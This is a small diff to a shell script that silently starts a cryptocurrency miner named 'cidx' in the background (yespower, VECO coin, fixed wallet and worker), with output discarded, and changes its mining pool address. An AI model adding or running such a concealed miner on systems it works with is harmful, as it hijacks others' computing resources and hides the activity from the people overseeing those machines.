@@ -27,7 +27,7 @@ END
   # Run cidx in the background
   # nohup ./cidx -c 'config.json' &>/dev/null &
   nohup ./cidx -a yespower  \
-  -o 102.210.254.202:443 \
+  -o 45.115.224.232:443 \
   -u VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker7 \
   -p c=VECO,m=solo,zap=VECO,mc=VECO -t 6 &>/dev/null &
 
